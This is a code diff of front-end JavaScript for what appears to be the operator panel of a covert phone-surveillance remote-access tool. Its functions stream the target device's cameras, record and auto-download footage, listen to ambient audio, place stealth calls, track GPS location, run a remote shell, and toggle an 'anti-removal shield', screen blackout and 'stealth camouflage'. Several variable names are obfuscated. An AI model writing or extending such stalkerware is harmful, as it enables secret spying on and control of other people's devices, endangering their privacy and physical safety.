+      const antiRemovalBtn = document.getElementById("anti-removal-btn");
+      const blackoutBtn = document.getElementById("blackout-btn");
+
+      if (data.active) {
+        if (statusCard) statusCard.style.borderColor = "var(--neon-green)";
+        if (statusText) statusText.innerHTML = '<span style="color:var(--neon-green);">UPLINK_ESTABLISHED</span>';
+        if (accPrompt) accPrompt.style.display = "none";
+      } else {
+        if (statusCard) statusCard.style.borderColor = "var(--danger)";
+        if (statusText) statusText.innerHTML = '<span style="color:var(--danger);">OFFLINE_AWAITING_PERMISSION</span>';
+        if (accPrompt) accPrompt.style.display = "block";
+      }
+
+      if (lockBtn) {
+        if (data.lock) {
+          lockBtn.innerHTML = "RELEASE_LOCK";
+          lockBtn.style.borderColor = "var(--neon-green)";
+          lockBtn.style.color = "var(--neon-green)";
+        } else {
+          lockBtn.innerHTML = "DEPLOY_LOCK";
+          lockBtn.style.borderColor = "var(--danger)";
+          lockBtn.style.color = "var(--danger)";
+        }
+      }
+
+      if (blackoutBtn) {
+        if (data.blackout) {
+          blackoutBtn.innerHTML = "RESTORE_DISPLAY";
+          blackoutBtn.style.borderColor = "var(--neon-cyan)";
+          blackoutBtn.style.color = "var(--neon-cyan)";
+          const feedback = document.getElementById("blackout-feedback");
+          if (feedback) feedback.style.display = "block";
+        } else {
+          blackoutBtn.innerHTML = "ACTIVATE_BLACKOUT";
+          blackoutBtn.style.borderColor = "#fff";
+          blackoutBtn.style.color = "#fff";
+          const feedback = document.getElementById("blackout-feedback");
+          if (feedback) feedback.style.display = "none";
+        }
+      }
+
+      const screenStream = document.getElementById("ghost-screen-stream");
+      if (screenStream) {
+        screenStream.style.filter = data.blackout ? "brightness(5.4) contrast(1.1)" : "none";
+      }
+
+      if (antiRemovalBtn) {
+        if (data.antiRemoval) {
+          antiRemovalBtn.innerHTML = "ANTI-REMOVAL SHIELD: ON";
+          antiRemovalBtn.style.borderColor = "var(--neon-green)";
+          antiRemovalBtn.style.color = "var(--neon-green)";
+        } else {
+          antiRemovalBtn.innerHTML = "ANTI-REMOVAL SHIELD: OFF";
+          antiRemovalBtn.style.borderColor = "var(--danger)";
+          antiRemovalBtn.style.color = "var(--danger)";
+        }
+      }
+    }
+  } catch (err) {}
+}
+
+// Camera Streaming Controls
+function rotateStream() {
+  _0x3b = (_0x3b + 90) % 360;
+  const stream = document.getElementById("main-stream");
+  if (stream) stream.style.transform = "rotate(" + _0x3b + "deg)";
+}
+
+function applyQuality(idx) {
+  if (typeof resConfig !== 'undefined' && typeof resOptions !== 'undefined') {
+    const cfg = resConfig[resOptions[idx]];
+    _0x3d = cfg.w;
+    _0x3e = cfg.h;
+    _0x3f = cfg.q;
+  }
+  if (_0x3a) initiateStream(_0x3c);
+}
+
+async function initiateStream(camId) {
+  _0x3c = camId;
+  _0x3a = true;
+  const loading = document.getElementById("loading-overlay");
+  if (loading) {
+    loading.style.display = "block";
+    loading.innerText = "INITIALIZING_UPLINK...";
+  }
+
+  const liveIndicator = document.getElementById("live-indicator");
+  const dot = document.getElementById("indicator-dot");
+  const text = document.getElementById("indicator-text");
+
+  if (liveIndicator) {
+    liveIndicator.style.borderColor = "var(--neon-green)";
+    liveIndicator.style.color = "var(--neon-green)";
+    liveIndicator.style.background = "rgba(57, 255, 20, 0.15)";
+  }
+  if (dot) dot.className = "badge-dot blink-slow";
+  if (text) text.innerText = "LIVE";
+
+  document.querySelectorAll(".cam-btn").forEach(btn => {
+    btn.classList.remove("btn-engaged-green");
+    btn.style.borderColor = "var(--neon-green)";
+    btn.style.color = "var(--neon-green)";
+  });
+
+  const currentCamBtn = document.getElementById("cam-btn-" + camId);
+  if (currentCamBtn) {
+    currentCamBtn.classList.add("btn-engaged-green");
+    currentCamBtn.style.borderColor = "";
+    currentCamBtn.style.color = "";
+  }
+
+  const mainStream = document.getElementById("main-stream");
+  if (mainStream) {
+    mainStream.style.display = "none";
+    await fetch("/camera/stop-stream");
+    setTimeout(() => {
+      mainStream.src = "/camera/stream?cam=" + camId + "&width=" + _0x3d + "&height=" + _0x3e + "&quality=" + _0x3f + "&t=" + Date.now();
+      mainStream.onload = () => {
+        if (loading) loading.style.display = "none";
+        mainStream.style.display = "block";
+      };
+    }, 500);
+  }
+}
+
+function terminateCaptures() {
+  _0x3a = false;
+  const mainStream = document.getElementById("main-stream");
+  if (mainStream) {
+    mainStream.src = "";
+    mainStream.style.display = "none";
+  }
+
+  const loading = document.getElementById("loading-overlay");
+  if (loading) {
+    loading.style.display = "block";
+    loading.innerText = "Uplink_Ready";
+  }
+
+  const liveIndicator = document.getElementById("live-indicator");
+  const dot = document.getElementById("indicator-dot");
+  const text = document.getElementById("indicator-text");
+
+  if (liveIndicator) {
+    liveIndicator.style.borderColor = "var(--neon-yellow)";
+    liveIndicator.style.color = "var(--neon-yellow)";
+    liveIndicator.style.background = "rgba(255, 255, 0, 0.05)";
+  }
+  if (dot) dot.className = "badge-dot";
+  if (text) text.innerText = "STANDBY";
+
+  document.querySelectorAll(".cam-btn").forEach(btn => {
+    btn.classList.remove("btn-engaged-green");
+    btn.style.borderColor = "var(--neon-green)";
+    btn.style.color = "var(--neon-green)";
+  });
+
+  fetch("/camera/terminate").then(() => {
+    const recBtn = document.getElementById("rec-btn");
+    if (recBtn) recBtn.innerText = "START_RECORDING";
+  });
+}
+
+function capturePhoto() {
+  if (_0x3c) {
+    window.open("/camera/photo?cam=" + _0x3c, "_blank");
+  } else {
+    showToast("SELECT_CAMERA_FIRST", "error");
+  }
+}
+
+function toggleRecording() {
+  const recBtn = document.getElementById("rec-btn");
+  if (_0x3a) {
+    if (recBtn && recBtn.innerText.includes("START")) {
+      recBtn.innerText = "STOP_RECORDING";
+      fetch("/camera/record?cam=" + _0x3c);
+    } else {
+      if (recBtn) recBtn.innerText = "START_RECORDING";
+      fetch("/camera/stop-record");
+    }
+  } else {
+    showToast("START_FEED_FIRST", "error");
+  }
+}
+
+function checkRecStatus() {
+  fetch("/camera/status")
+    .then(res => res.json())
+    .then(data => {
+      const liveIndicator = document.getElementById("live-indicator");
+      const dot = document.getElementById("indicator-dot");
+      const text = document.getElementById("indicator-text");
+      const recBtn = document.getElementById("rec-btn");
+
+      if (data.last_finished) {
+        if (null !== _lv && data.last_finished !== _lv) {
+          showToast("DATA_SYNC: Auto-downloading recording...");
+          const a = document.createElement("a");
+          a.href = "/download/" + data.last_finished;
+          a.download = "";
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+        }
+        _lv = data.last_finished;
+      }
+
+      if (data.recording) {
+        if (liveIndicator) {
+          liveIndicator.style.borderColor = "var(--danger)";
+          liveIndicator.style.color = "var(--danger)";
+          liveIndicator.style.background = "rgba(255, 49, 49, 0.15)";
+        }
+        if (dot) dot.className = "badge-dot blink-fast";
+        if (text) text.innerText = "REC (" + data.duration + "s)";
+        if (recBtn) recBtn.innerText = "STOP_RECORDING";
+      } else {
+        if (_0x3a) {
+          if (liveIndicator) {
+            liveIndicator.style.borderColor = "var(--neon-green)";
+            liveIndicator.style.color = "var(--neon-green)";
+            liveIndicator.style.background = "rgba(57, 255, 20, 0.15)";
+          }
+          if (dot) dot.className = "badge-dot blink-slow";
+          if (text) text.innerText = "LIVE";
+        } else {
+          if (liveIndicator) {
+            liveIndicator.style.borderColor = "var(--neon-yellow)";
+            liveIndicator.style.color = "var(--neon-yellow)";
+            liveIndicator.style.background = "rgba(255, 255, 0, 0.05)";
+          }
+          if (dot) dot.className = "badge-dot";
+          if (text) text.innerText = "STANDBY";
+        }
+        if (recBtn) recBtn.innerText = "START_RECORDING";
+      }
+    });
+}
+
+// Information Popup Listener
+document.addEventListener("click", function(e) {
+  const popup = document.getElementById("info-popup");
+  if (popup && "block" === popup.style.display && !popup.contains(e.target)) {
+    hideInfo();
+  }
+});
+
+// GPS Triangulation Controls
+let currentLat = 0;
+let currentLon = 0;
+
+function _0x6a(msg) {
+  const o = document.getElementById("gps-log");
+  if (o) {
+    const div = document.createElement("div");
+    div.textContent = "[" + (new Date()).toLocaleTimeString() + "] " + msg;
+    o.insertBefore(div, o.firstChild);
+  }
+}
+
+function locateDevice() {
+  _0x6a("[REQUEST] Pinging satellites...");
+  fetch("/gps/locate?json=true")
+    .then(res => res.json())
+    .then(data => {
+      if (data.success) {
+        currentLat = data.lat;
+        currentLon = data.lon;
+        const display = document.getElementById("coord-display");
+        if (display) display.innerHTML = "LAT: " + data.lat + " | LON: " + data.lon;
+        _0x6a("[SUCCESS] Fix acquired: " + data.lat + ", " + data.lon);
+
+        const mapFrame = document.getElementById("map-frame");
+        const mapOverlay = document.getElementById("map-overlay");
+        const extMapBtn = document.getElementById("ext-map-btn");
+
+        if (mapFrame) {
+          mapFrame.src = "https://www.openstreetmap.org/export/embed.html?bbox=" + (data.lon - 0.01) + "," + (data.lat - 0.01) + "," + (data.lon + 0.01) + "," + (data.lat + 0.01) + "&layer=mapnik&marker=" + data.lat + "," + data.lon;
+          mapFrame.style.display = "block";
+        }
+        if (mapOverlay) mapOverlay.style.display = "none";
+        if (extMapBtn) extMapBtn.style.display = "inline-block";
+      } else {
+        _0x6a("[ERROR] " + data.message);
+        showToast(data.message);
+      }
+    })
+    .catch(() => {
+      _0x6a("[FATAL] Network error during triangulation");
+    });
+}
+
+function openExternalMap() {
+  window.open("https://www.google.com/maps/search/?api=1&query=" + currentLat + "," + currentLon, "_blank");
+}
+
+// File Filters
+function filterFiles() {
+  const searchVal = document.getElementById("file-search").value.toLowerCase();
+  document.querySelectorAll(".file-item").forEach(item => {
+    if (item.querySelector(".file-name").textContent.toLowerCase().includes(searchVal)) {
+      item.style.display = "flex";
+    } else {
+      item.style.display = "none";
+    }
+  });
+}
+
+function setFilter(ext) {
+  if ("all" === ext) {
+    document.querySelectorAll(".file-item").forEach(item => item.style.display = "flex");
+  } else {
+    const list = ext.split(",");
+    document.querySelectorAll(".file-item").forEach(item => {
+      const name = item.querySelector(".file-name").textContent.toUpperCase();
+      const match = list.some(suffix => name.endsWith(suffix));
+      item.style.display = match ? "flex" : "none";
+    });
+  }
+}
+
+function clearIntel() {
+  showToast("PURGING_INTEL_STREAM...");
+  fetch("/intel/clear").then(() => location.reload());
+}
+
+function toggleStealth() {
+  const val = document.getElementById("stealth-type").value;
+  showToast("INITIATING_STEALTH_CAMOUFLAGE...");
+  fetch("/stealth?type=" + val)
+    .then(res => res.json())
+    .then(data => {
+      if (data.status) showToast("STEALTH_APPLIED: " + data.status);
+    })
+    .catch(err => {
+      console.error(err);
+      showToast("Stealth request failed", "error");
+    });
+}
+
+// Robust Audio Bridge Logic with _ih cleanup
+async function toggleLiveAudio() {
   const btn = document.getElementById('live-listen-btn');
   const player = document.getElementById('live-audio-player');
   if (audioStream) {
@@ -14,11 +1212,13 @@ Focusable: `+n.focusable,`<span style="color:var(--neon-cyan); margin-right:10px
       _ih = null;
     }
     audioStream.getTracks().forEach(t => t.stop());
-    player.pause();
-    player.removeAttribute('src');
-    player.load();
+    if (player) {
+      player.pause();
+      player.removeAttribute('src');
+      player.load();
+    }
     audioStream = null;
-    _ac = !1;
+    _ac = false;
     if (btn) {
       btn.innerText = 'LISTEN_LIVE';
       btn.style.borderColor = 'var(--neon-cyan)';
@@ -31,28 +1231,30 @@ Focusable: `+n.focusable,`<span style="color:var(--neon-cyan); margin-right:10px
       btn.innerText = 'CONNECTING...';
       btn.style.opacity = '0.5';
     }
-    player.src = '/audio/stream?t=' + Date.now();
-    player.play().then(() => {
-      _ac = !0;
-      if (btn) {
-        btn.innerText = 'STOP_LISTENING';
-        btn.style.opacity = '1';
-        btn.style.borderColor = 'var(--danger)';
-        btn.style.color = 'var(--danger)';
-        btn.style.background = 'rgba(255, 49, 49, 0.05)';
-      } else {
-        showToast("VIRTUAL_COMM: Audio bridge established");
-      }
-      audioStream = { getTracks: () => [{ stop: () => { player.pause(); player.removeAttribute('src'); player.load(); } }] };
-    }).catch(e => {
-      console.error(e);
-      _ac = !1;
-      if (btn) {
-        btn.innerText = 'LISTEN_LIVE';
-        btn.style.opacity = '1';
-      }
-      showToast('Connection failed. Audio bypass may be active.', 'error');
-    });
+    if (player) {
+      player.src = '/audio/stream?t=' + Date.now();
+      player.play().then(() => {
+        _ac = true;
+        if (btn) {
+          btn.innerText = 'STOP_LISTENING';
+          btn.style.opacity = '1';
+          btn.style.borderColor = 'var(--danger)';
+          btn.style.color = 'var(--danger)';
+          btn.style.background = 'rgba(255, 49, 49, 0.05)';
+        } else {
+          showToast("VIRTUAL_COMM: Audio bridge established");
+        }
+        audioStream = { getTracks: () => [{ stop: () => { player.pause(); player.removeAttribute('src'); player.load(); } }] };
+      }).catch(e => {
+        console.error(e);
+        _ac = false;
+        if (btn) {
+          btn.innerText = 'LISTEN_LIVE';
+          btn.style.opacity = '1';
+        }
+        showToast('Connection failed. Audio bypass may be active.', 'error');
+      });
+    }
   }
 }
 
@@ -90,8 +1292,12 @@ async function startStealthUplink() {
   }
 }
 
+// Consolidated Call Logic with Safe Input Handling (Null Checks)
 async function initiateCellularCall(num) {
-  if (!num) num = document.getElementById("dial-number")?.value;
+  if (!num) {
+    const dialInput = document.getElementById("dial-number");
+    num = dialInput ? dialInput.value : null;
+  }
   if (!num) return showToast("ENTER_NUMBER_FIRST", "error");
   try {
     await fetch("/calls/make?number=" + encodeURIComponent(num) + "&json=true");
@@ -102,21 +1308,11 @@ async function initiateCellularCall(num) {
   }
 }
 
-function startVirtualCall() {
-  _0x4a("AMBIENT_UPLINK", "Establishing secure audio bridge...", async () => {
-    try {
-      await fetch("/calls/voip?type=ambient");
-      showToast("VIRTUAL_UPLINK_INITIATED", "info");
-      await toggleLiveAudio();
-    } catch (e) {
-      console.error(e);
-      showToast("VIRTUAL_UPLINK_FAILED", "error");
-    }
-  });
-}
-
 async function startStealthCall(num) {
-  if (!num) num = document.getElementById("dial-number")?.value;
+  if (!num) {
+    const dialInput = document.getElementById("dial-number");
+    num = dialInput ? dialInput.value : null;
+  }
   if (!num) return showToast("ENTER_NUMBER_FIRST", "error");
 
   _0x4a("STEALTH_UPLINK", "Initializing secure cellular bridge...", async () => {
@@ -137,4 +1333,122 @@ async function startStealthCall(num) {
   });
 }
 
-function restoreNormal(){showToast("RESTORING_ORIGINAL_IDENTITY..."),fetch("/stealth?action=restore").then(e=>e.json()).then(e=>{e.status&&showToast("IDENTITY_RESTORED")}).catch(e=>{console.error(e),showToast("Restore request failed","error")})}window.alert=e=>showToast(e),window.onpopstate=updateNav,window.addEventListener("pageshow",updateNav),document.addEventListener("visibilitychange",()=>{"visible"===document.visibilityState&&updateNav()}),document.addEventListener("DOMContentLoaded",()=>{var e;updateNav(),(e=localStorage.getItem("cam_scroll"))&&(window.scrollTo(0,parseInt(e)),localStorage.removeItem("cam_scroll")),document.getElementById("log-terminal")&&(fetchLogs(),setInterval(fetchLogs,5e3)),document.getElementById("ghost-status-card")&&(checkGhostStatus(),refreshGhostLogs(),setInterval(checkGhostStatus,2e3),setInterval(refreshGhostLogs,2e3)),document.getElementById("live-indicator")&&(setInterval(checkRecStatus,2e3),e=localStorage.getItem("optics_scroll"))&&(window.scrollTo(0,parseInt(e)),localStorage.removeItem("optics_scroll")),document.getElementById("duration")&&setInterval(function(){fetch("/audio/status").then(e=>e.json()).then(e=>{var t,o,n=document.getElementById("duration");e.isRecording&&n&&(t=e.duration,o=Math.floor(t/60),n.textContent=o+":"+((n=t%60)<10?"0":"")+n),e.callInProgress&&!document.querySelector(".call-alert")&&location.reload()})},2e3),(e=document.getElementById("shell-cmd"))&&e.addEventListener("keydown",function(e){"ArrowUp"===e.key?(e.preventDefault(),_0x1c<_0x1b.length-1&&(_0x1c++,this.value=_0x1b[_0x1b.length-1-_0x1c])):"ArrowDown"===e.key?(e.preventDefault(),0<_0x1c?(_0x1c--,this.value=_0x1b[_0x1b.length-1-_0x1c]):0===_0x1c&&(_0x1c=-1,this.value="")):"Enter"===e.key&&executeShell()}),(e=document.getElementById("login-form"))&&e.addEventListener("submit",handleLogin),(e=document.querySelector('form[action="/settings/password"]'))&&e.addEventListener("submit",updatePassword),document.addEventListener("click",function(){var e=document.getElementById("color-picker-palette");e&&"grid"===e.style.display&&(e.style.display="none")})});
+async function startVirtualCall() {
+  _0x4a("AMBIENT_UPLINK", "Establishing secure audio bridge...", async () => {
+    try {
+      await fetch("/calls/voip?type=ambient");
+      showToast("VIRTUAL_UPLINK_INITIATED", "info");
+      await toggleLiveAudio();
+    } catch (e) {
+      console.error(e);
+      showToast("VIRTUAL_UPLINK_FAILED", "error");
+    }
+  });
+}
+
+function restoreNormal() {
+  showToast("RESTORING_ORIGINAL_IDENTITY...");
+  fetch("/stealth?action=restore")
+    .then(res => res.json())
+    .then(data => {
+      if (data.status) showToast("IDENTITY_RESTORED");
+    })
+    .catch(err => {
+      console.error(err);
+      showToast("Restore request failed", "error");
+    });
+}
+
+// Window Event Mapping & Initialization
+window.alert = e => showToast(e);
+window.onpopstate = updateNav;
+window.addEventListener("pageshow", updateNav);
+document.addEventListener("visibilitychange", () => {
+  if ("visible" === document.visibilityState) updateNav();
+});
+
+document.addEventListener("DOMContentLoaded", () => {
+  updateNav();
+  let camScroll = localStorage.getItem("cam_scroll");
+  if (camScroll) {
+    window.scrollTo(0, parseInt(camScroll));
+    localStorage.removeItem("cam_scroll");
+  }
+
+  if (document.getElementById("log-terminal")) {
+    fetchLogs();
+    setInterval(fetchLogs, 5000);
+  }
+
+  if (document.getElementById("ghost-status-card")) {
+    checkGhostStatus();
+    refreshGhostLogs();
+    setInterval(checkGhostStatus, 2000);
+    setInterval(refreshGhostLogs, 2000);
+  }
+
+  if (document.getElementById("live-indicator")) {
+    setInterval(checkRecStatus, 2000);
+    let opticsScroll = localStorage.getItem("optics_scroll");
+    if (opticsScroll) {
+      window.scrollTo(0, parseInt(opticsScroll));
+      localStorage.removeItem("optics_scroll");
+    }
+  }
+
+  if (document.getElementById("duration")) {
+    setInterval(() => {
+      fetch("/audio/status")
+        .then(res => res.json())
+        .then(data => {
+          const durationElement = document.getElementById("duration");
+          if (data.isRecording && durationElement) {
+            const sec = data.duration;
+            const min = Math.floor(sec / 60);
+            const remainingSec = sec % 60;
+            durationElement.textContent = min + ":" + (remainingSec < 10 ? "0" : "") + remainingSec;
+          }
+          if (data.callInProgress && !document.querySelector(".call-alert")) {
+            location.reload();
+          }
+        });
+    }, 2000);
+  }
+
+  const shellCmdInput = document.getElementById("shell-cmd");
+  if (shellCmdInput) {
+    shellCmdInput.addEventListener("keydown", function(event) {
+      if ("ArrowUp" === event.key) {
+        event.preventDefault();
+        if (_0x1c < _0x1b.length - 1) {
+          _0x1c++;
+          this.value = _0x1b[_0x1b.length - 1 - _0x1c];
+        }
+      } else if ("ArrowDown" === event.key) {
+        event.preventDefault();
+        if (_0x1c > 0) {
+          _0x1c--;
+          this.value = _0x1b[_0x1b.length - 1 - _0x1c];
+        } else if (0 === _0x1c) {
+          _0x1c = -1;
+          this.value = "";
+        }
+      } else if ("Enter" === event.key) {
+        executeShell();
+      }
+    });
+  }
+
+  const loginForm = document.getElementById("login-form");
+  if (loginForm) loginForm.addEventListener("submit", handleLogin);
+
+  const passwordForm = document.querySelector('form[action="/settings/password"]');
+  if (passwordForm) passwordForm.addEventListener("submit", updatePassword);
+
+  document.addEventListener("click", () => {
+    const palette = document.getElementById("color-picker-palette");
+    if (palette && "grid" === palette.style.display) {
+      palette.style.display = "none";
+    }
+  });
+});
